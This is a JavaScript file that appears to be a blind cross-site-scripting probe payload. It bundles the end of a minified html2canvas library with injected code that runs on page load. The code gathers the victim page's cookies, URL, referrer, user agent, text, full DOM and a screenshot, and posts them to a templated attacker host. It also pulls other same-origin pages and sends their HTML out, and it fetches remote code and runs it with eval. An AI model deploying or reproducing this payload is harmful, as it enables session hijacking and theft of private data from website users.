r?r.substring(0,100):r))},this)}},m.prototype.hasImageBackground=function(t){return"none"!==t.method},m.prototype.loadImage=function(t){if("url"===t.method){var e=t.args[0];return!this.isSVG(e)||this.support.svg||this.options.allowTaint?e.match(/data:image\/.*;base64,/i)?new g(e.replace(/url\(['"]{0,}|['"]{0,}\)$/gi,""),!1):this.isSameOrigin(e)||this.options.allowTaint===!0||this.isSVG(e)?new g(e,!1):this.support.cors&&!this.options.allowTaint&&this.options.useCORS?new g(e,!0):this.options.proxy?new ue(e,this.options.proxy):new p(e):new fe(e)}return"linear-gradient"===t.method?new x(t):"gradient"===t.method?new we(t):"svg"===t.method?new me(t.args[0]):new p(t)},m.prototype.isSVG=function(t){return/(.+).svg$/i.test(t)||fe.prototype.isInline(t)},m.prototype.imageExists=function(t,e){return t.some(function(t){return t.src===e})},m.prototype.isSameOrigin=function(t){var n=this.link||(this.link=e.createElement("a"));n.href=t,n.href=n.href;var r=n.protocol+n.hostname+n.port;return r===this.origin},m.prototype.getPromise=function(t){return t.promise},m.prototype.get=function(t){var e=null;return this.images.some(function(n){return(e=n).src===t})?e:null},m.prototype.fetch=function(t){return this.images=t.reduce(ie(this.findBackgroundImage,this),this.findImages(t)),this.images.forEach(function(t,e){t.promise.then(function(){E("Succesfully loaded image #"+(e+1))},function(){E("Failed loading image #"+(e+1))})}),this.ready=Promise.all(this.images.map(this.getPromise)),E("Finished searching images"),this},x.prototype=Object.create(f.prototype),x.prototype.stepRegExp=/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%|px)?/,T.prototype.assignStack=function(t){this.stack=t,t.children.push(this)},T.prototype.isElementVisible=function(){return this.node.nodeType===Node.TEXT_NODE?this.parent.visible:"none"!==this.css("display")&&"hidden"!==this.css("visibility")&&!this.node.hasAttribute("data-html2canvas-ignore")},T.prototype.css=function(t){return this.computedStyles||(this.computedStyles=this.computedStyle(null)),this.styles[t]||(this.styles[t]=this.computedStyles[t])},T.prototype.prefixedCss=function(t){var e=["webkit","moz","ms","o"],r=this.css(t);return r===n&&e.some(function(e){return r=this.css(e+t.substr(0,1).toUpperCase()+t.substr(1)),r!==n},this),r===n?null:r},T.prototype.computedStyle=function(t){return this.node.ownerDocument.defaultView.getComputedStyle(this.node,t)},T.prototype.cssInt=function(t){var e=parseInt(this.css(t),10);return isNaN(e)?0:e},T.prototype.cssFloat=function(t){var e=parseFloat(this.css(t));return isNaN(e)?0:e},T.prototype.fontWeight=function(){var t=this.css("fontWeight");switch(parseInt(t,10)){case 401:t="bold";break;case 400:t="normal"}return t},T.prototype.parseBackgroundImages=function(){return this.backgroundImages||(this.backgroundImages=S(this.css("backgroundImage")))},T.prototype.cssList=function(t,e){var n=(this.css(t)||"").split(",");return n=n[e||0]||n[0]||"auto",n=n.trim().split(" "),1===n.length&&(n=[n[0],n[0]]),n},T.prototype.parseBackgroundSize=function(t,e,n){var r,i,o=this.cssList("backgroundSize",n);if(I(o[0]))r=t.width*parseFloat(o[0])/100;else{if(/contain|cover/.test(o[0])){var s=t.width/t.height,a=e.width/e.height;return a>s^"contain"===o[0]?{width:t.height*a,height:t.height}:{width:t.width,height:t.width/a}}r=parseInt(o[0],10)}return i="auto"===o[0]&&"auto"===o[1]?e.height:"auto"===o[1]?r/e.width*e.height:I(o[1])?t.height*parseFloat(o[1])/100:parseInt(o[1],10),"auto"===o[0]&&(r=i/e.height*e.width),{width:r,height:i}},T.prototype.parseBackgroundPosition=function(t,e,n,r){var i,o,s=this.cssList("backgroundPosition",n);return i=I(s[0])?(t.width-(r||e).width)*(parseFloat(s[0])/100):parseInt(s[0],10),o="auto"===s[1]?i/e.width*e.height:I(s[1])?(t.height-(r||e).height)*parseFloat(s[1])/100:parseInt(s[1],10),"auto"===s[0]&&(i=o/e.height*e.width),{left:i,top:o}},T.prototype.parseBackgroundRepeat=function(t){return this.cssList("backgroundRepeat",t)[0]},T.prototype.parseTextShadows=function(){var t=this.css("textShadow"),e=[];if(t&&"none"!==t)for(var n=t.match(this.TEXT_SHADOW_PROPERTY),r=0;n&&r<n.length;r++){var i=n[r].match(this.TEXT_SHADOW_VALUES);e.push({color:i[0],offsetX:i[1]?i[1].replace("px",""):0,offsetY:i[2]?i[2].replace("px",""):0,blur:i[3]?i[3].replace("px",""):0})}return e},T.prototype.parseTransform=function(){if(!this.transformData)if(this.hasTransform()){var t=this.parseBounds(),e=this.prefixedCss("transformOrigin").split(" ").map(R).map(O);e[0]+=t.left,e[1]+=t.top,this.transformData={origin:e,matrix:this.parseTransformMatrix()}}else this.transformData={origin:[0,0],matrix:[1,0,0,1,0,0]};return this.transformData},T.prototype.parseTransformMatrix=function(){if(!this.transformMatrix){var t=this.prefixedCss("transform"),e=t?k(t.match(this.MATRIX_PROPERTY)):null;this.transformMatrix=e?e:[1,0,0,1,0,0]}return this.transformMatrix},T.prototype.parseBounds=function(){return this.bounds||(this.bounds=this.hasTransform()?M(this.node):B(this.node))},T.prototype.hasTransform=function(){return"1,0,0,1,0,0"!==this.parseTransformMatrix().join(",")||this.parent&&this.parent.hasTransform()},T.prototype.getValue=function(){var t=this.node.value||"";return t="SELECT"===this.node.tagName?C(this.node):t,0===t.length?this.node.placeholder||"":t},T.prototype.MATRIX_PROPERTY=/(matrix)\((.+)\)/,T.prototype.TEXT_SHADOW_PROPERTY=/((rgba|rgb)\([^\)]+\)(\s-?\d+px){0,})/g,T.prototype.TEXT_SHADOW_VALUES=/(-?\d+px)|(#.+)|(rgb\(.+\))|(rgba\(.+\))/g,P.prototype.asyncRenderer=function(t,e,n){n=n||Date.now(),this.paint(t[this.renderIndex++]),t.length===this.renderIndex?e():n+20>Date.now()?this.asyncRenderer(t,e,n):setTimeout(ie(function(){this.asyncRenderer(t,e)},this),0)},P.prototype.createPseudoHideStyles=function(t){var e=t.createElement("style");e.innerHTML="."+this.pseudoHideClass+':before { content: "" !important; display: none !important; }.'+this.pseudoHideClass+':after { content: "" !important; display: none !important; }',t.body.appendChild(e)},P.prototype.getPseudoElements=function(t){var e=[[t]];if(t.node.nodeType===Node.ELEMENT_NODE){var n=this.getPseudoElement(t,":before"),r=this.getPseudoElement(t,":after");n&&(t.node.insertBefore(n[0].node,t.node.firstChild),e.push(n)),r&&(t.node.appendChild(r[0].node),e.push(r)),(n||r)&&(t.node.className+=" "+this.pseudoHideClass)}return ce(e)},P.prototype.getPseudoElement=function(t,n){var r=t.computedStyle(n);if(!r||!r.content||"none"===r.content||"-moz-alt-content"===r.content||"none"===r.display)return null;for(var i=he(r.content),o="url"===i.substr(0,3),s=e.createElement(o?"img":"html2canvaspseudoelement"),a=new T(s,t),c=r.length-1;c>=0;c--){var h=A(r.item(c));s.style[h]=r[h]}if(s.className=this.pseudoHideClass,o)return s.src=S(i)[0].args[0],[a];var u=e.createTextNode(i);return s.appendChild(u),[a,new ye(u,a)]},P.prototype.getChildren=function(t){return ce([].filter.call(t.node.childNodes,Q).map(function(e){var n=[e.nodeType===Node.TEXT_NODE?new ye(e,t):new T(e,t)].filter(ae);return e.nodeType===Node.ELEMENT_NODE&&n.length&&"TEXTAREA"!==e.tagName?n[0].isElementVisible()?n.concat(this.getChildren(n[0])):[]:n},this))},P.prototype.newStackingContext=function(t,e){var n=new le(e,t.cssFloat("opacity"),t.node,t.parent);n.visible=t.visible;var r=e?n.getParentStack(this):n.parent.stack;r.contexts.push(n),t.stack=n},P.prototype.createStackingContexts=function(){this.nodes.forEach(function(t){te(t)&&(this.isRootElement(t)||re(t)||q(t)||this.isBodyWithTransparentRoot(t)||t.hasTransform())?this.newStackingContext(t,!0):te(t)&&($(t)&&V(t)||K(t)||J(t))?this.newStackingContext(t,!1):t.assignStack(t.parent.stack)},this)},P.prototype.isBodyWithTransparentRoot=function(t){return"BODY"===t.node.nodeName&&this.renderer.isTransparent(t.parent.css("backgroundColor"))},P.prototype.isRootElement=function(t){return null===t.parent},P.prototype.sortStackingContexts=function(t){t.contexts.sort(ne),t.contexts.forEach(this.sortStackingContexts,this)},P.prototype.parseTextBounds=function(t){return function(e,n,r){if("none"!==t.parent.css("textDecoration").substr(0,4)||0!==e.trim().length){if(this.support.rangeBounds&&!t.parent.hasTransform()){var i=r.slice(0,n).join("").length;return this.getRangeBounds(t.node,i,e.length)}if(t.node&&"string"==typeof t.node.data){var o=t.node.splitText(e.length),s=this.getWrapperBounds(t.node,t.parent.hasTransform());return t.node=o,s}}else(!this.support.rangeBounds||t.parent.hasTransform())&&(t.node=t.node.splitText(e.length));return{}}},P.prototype.getWrapperBounds=function(t,e){var n=t.ownerDocument.createElement("html2canvaswrapper"),r=t.parentNode,i=t.cloneNode(!0);n.appendChild(t.cloneNode(!0)),r.replaceChild(n,t);var o=e?M(n):B(n);return r.replaceChild(i,n),o},P.prototype.getRangeBounds=function(t,e,n){var r=this.range||(this.range=t.ownerDocument.createRange());return r.setStart(t,e),r.setEnd(t,e+n),r.getBoundingClientRect()},P.prototype.parse=function(t){var e=t.contexts.filter(H),n=t.children.filter(te),r=n.filter(Z(J)),i=r.filter(Z($)).filter(Z(z)),o=n.filter(Z($)).filter(J),s=r.filter(Z($)).filter(z),a=t.contexts.concat(r.filter($)).filter(V),c=t.children.filter(ee).filter(X),h=t.contexts.filter(j);e.concat(i).concat(o).concat(s).concat(a).concat(c).concat(h).forEach(function(t){this.renderQueue.push(t),Y(t)&&(this.parse(t),this.renderQueue.push(new N))},this)},P.prototype.paint=function(t){try{t instanceof N?this.renderer.ctx.restore():ee(t)?this.paintText(t):this.paintNode(t)}catch(e){E(e)}},P.prototype.paintNode=function(t){Y(t)&&(this.renderer.setOpacity(t.opacity),this.renderer.ctx.save(),t.hasTransform()&&this.renderer.setTransform(t.parseTransform()));var e=t.parseBounds(),n=this.parseBorders(t);switch(this.renderer.clip(n.clip,function(){this.renderer.renderBackground(t,e,n.borders.map(se))},this),this.renderer.renderBorders(n.borders),t.node.nodeName){case"svg":var r=this.images.get(t.node);r?this.renderer.renderImage(t,e,n,r):E("Error loading <svg>",t.node);break;case"IMG":var i=this.images.get(t.node.src);i?this.renderer.renderImage(t,e,n,i):E("Error loading <img>",t.node.src);break;case"SELECT":case"INPUT":case"TEXTAREA":this.paintFormValue(t)}},P.prototype.paintFormValue=function(t){if(t.getValue().length>0){var e=t.node.ownerDocument,n=e.createElement("html2canvaswrapper"),r=["lineHeight","textAlign","fontFamily","fontWeight","fontSize","color","paddingLeft","paddingTop","paddingRight","paddingBottom","width","height","borderLeftStyle","borderTopStyle","borderLeftWidth","borderTopWidth","boxSizing","whiteSpace","wordWrap"];
r.forEach(function(e){try{n.style[e]=t.css(e)}catch(r){E("html2canvas: Parse: Exception caught in renderFormValue: "+r.message)}});var i=t.parseBounds();n.style.position="absolute",n.style.left=i.left+"px",n.style.top=i.top+"px",n.textContent=t.getValue(),e.body.appendChild(n),this.paintText(new ye(n.firstChild,t)),e.body.removeChild(n)}},P.prototype.paintText=function(t){t.applyTextTransform();var e=t.node.data.split(!this.options.letterRendering||G(t)?/(\b| )/:""),n=t.parent.fontWeight(),r=t.parent.css("fontSize"),i=t.parent.css("fontFamily"),o=t.parent.parseTextShadows();this.renderer.font(t.parent.css("color"),t.parent.css("fontStyle"),t.parent.css("fontVariant"),n,r,i),o.length?this.renderer.fontShadow(o[0].color,o[0].offsetX,o[0].offsetY,o[0].blur):this.renderer.clearShadow(),e.map(this.parseTextBounds(t),this).forEach(function(n,o){n&&(this.renderer.text(e[o],n.left,n.bottom),this.renderTextDecoration(t.parent,n,this.fontMetrics.getMetrics(i,r)))},this)},P.prototype.renderTextDecoration=function(t,e,n){switch(t.css("textDecoration").split(" ")[0]){case"underline":this.renderer.rectangle(e.left,Math.round(e.top+n.baseline+n.lineWidth),e.width,1,t.css("color"));break;case"overline":this.renderer.rectangle(e.left,Math.round(e.top),e.width,1,t.css("color"));break;case"line-through":this.renderer.rectangle(e.left,Math.ceil(e.top+n.middle+n.lineWidth),e.width,1,t.css("color"))}},P.prototype.parseBorders=function(t){var e=t.bounds,n=U(t),r=["Top","Right","Bottom","Left"].map(function(e){return{width:t.cssInt("border"+e+"Width"),color:t.css("border"+e+"Color"),args:null}}),i=D(e,n,r);return{clip:this.parseBackgroundClip(t,i,r,n,e),borders:r.map(function(t,o){if(t.width>0){var s=e.left,a=e.top,c=e.width,h=e.height-r[2].width;switch(o){case 0:h=r[0].width,t.args=F({c1:[s,a],c2:[s+c,a],c3:[s+c-r[1].width,a+h],c4:[s+r[3].width,a+h]},n[0],n[1],i.topLeftOuter,i.topLeftInner,i.topRightOuter,i.topRightInner);break;case 1:s=e.left+e.width-r[1].width,c=r[1].width,t.args=F({c1:[s+c,a],c2:[s+c,a+h+r[2].width],c3:[s,a+h],c4:[s,a+r[0].width]},n[1],n[2],i.topRightOuter,i.topRightInner,i.bottomRightOuter,i.bottomRightInner);break;case 2:a=a+e.height-r[2].width,h=r[2].width,t.args=F({c1:[s+c,a+h],c2:[s,a+h],c3:[s+r[3].width,a],c4:[s+c-r[3].width,a]},n[2],n[3],i.bottomRightOuter,i.bottomRightInner,i.bottomLeftOuter,i.bottomLeftInner);break;case 3:c=r[3].width,t.args=F({c1:[s,a+h+r[2].width],c2:[s,a],c3:[s+c,a+r[0].width],c4:[s+c,a+h]},n[3],n[0],i.bottomLeftOuter,i.bottomLeftInner,i.topLeftOuter,i.topLeftInner)}}return t})}},P.prototype.parseBackgroundClip=function(t,e,n,r,i){var o=t.css("backgroundClip"),s=[];switch(o){case"content-box":case"padding-box":W(s,r[0],r[1],e.topLeftInner,e.topRightInner,i.left+n[3].width,i.top+n[0].width),W(s,r[1],r[2],e.topRightInner,e.bottomRightInner,i.left+i.width-n[1].width,i.top+n[0].width),W(s,r[2],r[3],e.bottomRightInner,e.bottomLeftInner,i.left+i.width-n[1].width,i.top+i.height-n[2].width),W(s,r[3],r[0],e.bottomLeftInner,e.topLeftInner,i.left+n[3].width,i.top+i.height-n[2].width);break;default:W(s,r[0],r[1],e.topLeftOuter,e.topRightOuter,i.left,i.top),W(s,r[1],r[2],e.topRightOuter,e.bottomRightOuter,i.left+i.width,i.top),W(s,r[2],r[3],e.bottomRightOuter,e.bottomLeftOuter,i.left+i.width,i.top+i.height),W(s,r[3],r[0],e.bottomLeftOuter,e.topLeftOuter,i.left,i.top+i.height)}return s},P.prototype.pseudoHideClass="___html2canvas___pseudoelement";var Te=0;pe.prototype.renderImage=function(t,e,n,r){var i=t.cssInt("paddingLeft"),o=t.cssInt("paddingTop"),s=t.cssInt("paddingRight"),a=t.cssInt("paddingBottom"),c=n.borders,h=e.width-(c[1].width+c[3].width+i+s),u=e.height-(c[0].width+c[2].width+o+a);this.drawImage(r,0,0,r.image.width||h,r.image.height||u,e.left+i+c[3].width,e.top+o+c[0].width,h,u)},pe.prototype.renderBackground=function(t,e,n){e.height>0&&e.width>0&&(this.renderBackgroundColor(t,e),this.renderBackgroundImage(t,e,n))},pe.prototype.renderBackgroundColor=function(t,e){var n=t.css("backgroundColor");this.isTransparent(n)||this.rectangle(e.left,e.top,e.width,e.height,t.css("backgroundColor"))},pe.prototype.renderBorders=function(t){t.forEach(this.renderBorder,this)},pe.prototype.renderBorder=function(t){this.isTransparent(t.color)||null===t.args||this.drawShape(t.args,t.color)},pe.prototype.renderBackgroundImage=function(t,e,n){var r=t.parseBackgroundImages();r.reverse().forEach(function(r,i,o){switch(r.method){case"url":var s=this.images.get(r.args[0]);s?this.renderBackgroundRepeating(t,e,s,o.length-(i+1),n):E("Error loading background-image",r.args[0]);break;case"linear-gradient":case"gradient":var a=this.images.get(r.value);a?this.renderBackgroundGradient(a,e,n):E("Error loading background-image",r.args[0]);break;case"none":break;default:E("Unknown background-image type",r.args[0])}},this)},pe.prototype.renderBackgroundRepeating=function(t,e,n,r,i){var o=t.parseBackgroundSize(e,n.image,r),s=t.parseBackgroundPosition(e,n.image,r,o),a=t.parseBackgroundRepeat(r);switch(a){case"repeat-x":case"repeat no-repeat":this.backgroundRepeatShape(n,s,o,e,e.left+i[3],e.top+s.top+i[0],99999,n.image.height,i);break;case"repeat-y":case"no-repeat repeat":this.backgroundRepeatShape(n,s,o,e,e.left+s.left+i[3],e.top+i[0],n.image.width,99999,i);break;case"no-repeat":this.backgroundRepeatShape(n,s,o,e,e.left+s.left+i[3],e.top+s.top+i[0],n.image.width,n.image.height,i);break;default:this.renderBackgroundRepeat(n,s,o,{top:e.top,left:e.left},i[3],i[0])}},pe.prototype.isTransparent=function(t){return!t||"transparent"===t||"rgba(0, 0, 0, 0)"===t},le.prototype=Object.create(T.prototype),le.prototype.getParentStack=function(t){var e=this.parent?this.parent.stack:null;return e?e.ownStacking?e:e.getParentStack(t):t.stack},de.prototype.testRangeBounds=function(t){var e,n,r,i,o=!1;return t.createRange&&(e=t.createRange(),e.getBoundingClientRect&&(n=t.createElement("boundtest"),n.style.height="123px",n.style.display="block",t.body.appendChild(n),e.selectNode(n),r=e.getBoundingClientRect(),i=r.height,123===i&&(o=!0),t.body.removeChild(n))),o},de.prototype.testCORS=function(){return"undefined"!=typeof(new Image).crossOrigin},de.prototype.testSVG=function(){var t=new Image,n=e.createElement("canvas"),r=n.getContext("2d");t.src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'></svg>";try{r.drawImage(t,0,0),n.toDataURL()}catch(i){return!1}return!0},fe.prototype.hasFabric=function(){return html2canvas.fabric?Promise.resolve():Promise.reject(new Error("html2canvas.svg.js is not loaded, cannot render svg"))},fe.prototype.inlineFormatting=function(t){return/^data:image\/svg\+xml;base64,/.test(t)?this.decode64(this.removeContentType(t)):this.removeContentType(t)},fe.prototype.removeContentType=function(t){return t.replace(/^data:image\/svg\+xml(;base64)?,/,"")},fe.prototype.isInline=function(t){return/^data:image\/svg\+xml/i.test(t)},fe.prototype.createCanvas=function(t){var e=this;return function(n,r){var i=new html2canvas.fabric.StaticCanvas("c");e.image=i.lowerCanvasEl,i.setWidth(r.width).setHeight(r.height).add(html2canvas.fabric.util.groupSVGElements(n,r)).renderAll(),t(i.lowerCanvasEl)}},fe.prototype.decode64=function(e){return"function"==typeof t.atob?t.atob(e):ge(e)},me.prototype=Object.create(fe.prototype),ye.prototype=Object.create(T.prototype),ye.prototype.applyTextTransform=function(){this.node.data=this.transform(this.parent.css("textTransform"))},ye.prototype.transform=function(t){var e=this.node.data;switch(t){case"lowercase":return e.toLowerCase();case"capitalize":return e.replace(/(^|\s|:|-|\(|\))([a-z])/g,ve);case"uppercase":return e.toUpperCase();default:return e}},we.prototype=Object.create(f.prototype),xe.prototype=Object.create(pe.prototype),xe.prototype.setFillStyle=function(t){return this.ctx.fillStyle=t,this.ctx},xe.prototype.rectangle=function(t,e,n,r,i){this.setFillStyle(i).fillRect(t,e,n,r)},xe.prototype.drawShape=function(t,e){this.shape(t),this.setFillStyle(e).fill()},xe.prototype.taints=function(t){if(null===t.tainted){this.taintCtx.drawImage(t.image,0,0);try{this.taintCtx.getImageData(0,0,1,1),t.tainted=!1}catch(n){this.taintCtx=e.createElement("canvas").getContext("2d"),t.tainted=!0}}return t.tainted},xe.prototype.drawImage=function(t,e,n,r,i,o,s,a,c){(!this.taints(t)||this.options.allowTaint)&&this.ctx.drawImage(t.image,e,n,r,i,o,s,a,c)},xe.prototype.clip=function(t,e,n){this.ctx.save(),this.shape(t).clip(),e.call(n),this.ctx.restore()},xe.prototype.shape=function(t){return this.ctx.beginPath(),t.forEach(function(t,e){this.ctx[0===e?"moveTo":t[0]+"To"].apply(this.ctx,t.slice(1))},this),this.ctx.closePath(),this.ctx},xe.prototype.font=function(t,e,n,r,i,o){this.setFillStyle(t).font=[e,n,r,i,o].join(" ")},xe.prototype.fontShadow=function(t,e,n,r){this.setVariable("shadowColor",t).setVariable("shadowOffsetY",e).setVariable("shadowOffsetX",n).setVariable("shadowBlur",r)},xe.prototype.clearShadow=function(){this.setVariable("shadowColor","rgba(0,0,0,0)")},xe.prototype.setOpacity=function(t){this.ctx.globalAlpha=t},xe.prototype.setTransform=function(t){this.ctx.translate(t.origin[0],t.origin[1]),this.ctx.transform.apply(this.ctx,t.matrix),this.ctx.translate(-t.origin[0],-t.origin[1])},xe.prototype.setVariable=function(t,e){return this.variables[t]!==e&&(this.variables[t]=this.ctx[t]=e),this},xe.prototype.text=function(t,e,n){this.ctx.fillText(t,e,n)},xe.prototype.backgroundRepeatShape=function(t,e,n,r,i,o,s,a,c){var h=[["line",Math.round(i),Math.round(o)],["line",Math.round(i+s),Math.round(o)],["line",Math.round(i+s),Math.round(a+o)],["line",Math.round(i),Math.round(a+o)]];this.clip(h,function(){this.renderBackgroundRepeat(t,e,n,r,c[3],c[0])},this)},xe.prototype.renderBackgroundRepeat=function(t,e,n,r,i,o){var s=Math.round(r.left+e.left+i),a=Math.round(r.top+e.top+o);this.setFillStyle(this.ctx.createPattern(this.resizeImage(t,n),"repeat")),this.ctx.translate(s,a),this.ctx.fill(),this.ctx.translate(-s,-a)},xe.prototype.renderBackgroundGradient=function(t,e){if(t instanceof x){var n=this.ctx.createLinearGradient(e.left+e.width*t.x0,e.top+e.height*t.y0,e.left+e.width*t.x1,e.top+e.height*t.y1);t.colorStops.forEach(function(t){n.addColorStop(t.stop,t.color)}),this.rectangle(e.left,e.top,e.width,e.height,n)}},xe.prototype.resizeImage=function(t,n){var r=t.image;if(r.width===n.width&&r.height===n.height)return r;var i,o=e.createElement("canvas");return o.width=n.width,o.height=n.height,i=o.getContext("2d"),i.drawImage(r,0,0,r.width,r.height,0,0,n.width,n.height),o}}(window,document);

var chainload_uri = [CHAINLOAD_REPLACE_ME];
var collect_page_list = [COLLECT_PAGE_LIST_REPLACE_ME]

// Source: https://stackoverflow.com/a/20151856/1195812
function base64_to_blob(base64Data, contentType) {
    contentType = contentType || '';
    var sliceSize = 1024;
    var byteCharacters = atob(base64Data);
    var bytesLength = byteCharacters.length;
    var slicesCount = Math.ceil(bytesLength / sliceSize);
    var byteArrays = new Array(slicesCount);

    for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
        var begin = sliceIndex * sliceSize;
        var end = Math.min(begin + sliceSize, bytesLength);

        var bytes = new Array(end - begin);
        for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
            bytes[i] = byteCharacters[offset].charCodeAt(0);
        }
        byteArrays[sliceIndex] = new Uint8Array(bytes);
    }
    return new Blob(byteArrays, { type: contentType });
}

function get_guid() {
    var S4 = function() {
       return (((1+Math.random())*0x10000)|0).toString(16).substring(1);
    };
    return (S4()+S4()+"-"+S4()+"-"+S4()+"-"+S4()+"-"+S4()+S4()+S4());
}

function never_null( value ) {
    if( value !== undefined ) {
        return value;
    } else {
        return '';
    }
}

function collect_pages() {
    for( var i = 0; i < collect_page_list.length; i++ ) {
        // Make sure the path is correctly formatted
        if( collect_page_list[i].charAt(0) != "/" ) {
            collect_page_list[i] = "/" + collect_page_list[i];
        }
        collect_page_data( collect_page_list[i] );
    }
}

function eval_remote_source( uri ) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if ( xhr.readyState == XMLHttpRequest.DONE ) {
            eval( xhr.responseText );
        }
    }
    xhr.open( 'GET', uri, true );
    xhr.send( null );
}

function addEvent(element, eventName, fn) {
    if (element.addEventListener)
        element.addEventListener(eventName, fn, false);
    else if (element.attachEvent)
        element.attachEvent('on' + eventName, fn);
}

function get_dom_text() {
	var text_extractions_to_try = [
		document.body.outerText,
		document.body.innerText,
		document.body.textContent,
	];
	for(var i = 0; i < text_extractions_to_try.length; i++) {
		if(typeof text_extractions_to_try[i] === 'string') {
			return text_extractions_to_try[i];
		}
	}

	return '';
}

function generate_random_string(length) {
	var return_array = [];
	var characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
	var charactersLength = characters.length;
	for (var i = 0; i < length; i++) {
		return_array.push(characters.charAt(Math.floor(Math.random() * charactersLength)));
	}
	return return_array.join("");
}

function contact_mothership(probe_return_data) {
	var form_data = new FormData();
	var payload_keys = Object.keys(probe_return_data);
	payload_keys.map(function(payload_key) {
		if(payload_key === 'screenshot') {
			var base64_data = probe_return_data[payload_key].replace(
				'data:image/png;base64,',
				''
			);
			var screenshot_blob = base64_to_blob(
				base64_data,
				'image/png'
			);
			form_data.append(
				payload_key,
				screenshot_blob,
				"screenshot.png"
			)
			return
		}
		form_data.append(payload_key, probe_return_data[payload_key]);
	});

    var http = new XMLHttpRequest();
    var url = "[HOST_URL]/js_callback";
    http.open("POST", url, true);
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {

        }
    }
    http.send(form_data);
}

function send_collected_page( page_data ) {
	var form_data = new FormData();
	var payload_keys = Object.keys(page_data);
	payload_keys.map(function(payload_key) {
		form_data.append(payload_key, page_data[payload_key]);
	});

    var http = new XMLHttpRequest();
    var url = "[HOST_URL]/page_callback";
    http.open("POST", url, true);
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {

        }
    }
    http.send(form_data);
}

function collect_page_data( path ) {
    try {
        var full_url = location.protocol + "//" + document.domain + path
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                page_data = {
                    "html": xhr.responseText,
                    "uri": full_url
                }
                send_collected_page( page_data );
            }
        }
        xhr.open('GET', full_url, true);
        xhr.send(null);
    } catch ( e ) {
    }
}

probe_return_data = {};

// Prevent failure incase the browser refuses to give us any of the probe data.
try {
    probe_return_data['uri'] = never_null( location.toString() );
} catch ( e ) {
    probe_return_data['uri'] = '';
}
try {
    probe_return_data['cookies'] = never_null( document.cookie );
} catch ( e ) {
    probe_return_data['cookies'] = '';
}
try {
    probe_return_data['referrer'] = never_null( document.referrer );
} catch ( e ) {
    probe_return_data['referrer'] = '';
}
try {
    probe_return_data['user-agent'] = never_null( navigator.userAgent );
} catch ( e ) {
    probe_return_data['user-agent'] = '';
}
try {
    probe_return_data['browser-time'] = never_null( ( new Date().getTime() ) );
} catch ( e ) {
    probe_return_data['browser-time'] = '';
}
try {
    probe_return_data['probe-uid'] = never_null( get_guid() );
} catch ( e ) {
    probe_return_data['probe-uid'] = '';
}
try {
    probe_return_data['origin'] = never_null( location.origin );
} catch ( e ) {
    probe_return_data['origin'] = '';
}
try {
    probe_return_data['injection_key'] = [PROBE_ID];
} catch ( e ) {
    probe_return_data['injection_key'] = '';
}

probe_return_data['title'] = document.title;

probe_return_data['text'] = get_dom_text();

probe_return_data['was_iframe'] = !(window.top === window)

function hook_load_if_not_ready() {
    try {
        try {
            probe_return_data['dom'] = never_null( document.documentElement.outerHTML );
        } catch ( e ) {
            probe_return_data['dom'] = '';
        }
        html2canvas(document.body).then(function(canvas) {
            probe_return_data['screenshot'] = canvas.toDataURL();
            finishing_moves();
        });
    } catch( e ) {
        probe_return_data['screenshot'] = '';
        finishing_moves();
    }
}

function finishing_moves() {
    contact_mothership( probe_return_data );
    collect_pages();
    if( chainload_uri != "" && chainload_uri != null ) {
        eval_remote_source( chainload_uri );
    }
}

if( document.readyState == "complete" ) {
    hook_load_if_not_ready();
} else {
    addEvent( window, "load", function(){
        hook_load_if_not_ready();
    });
}
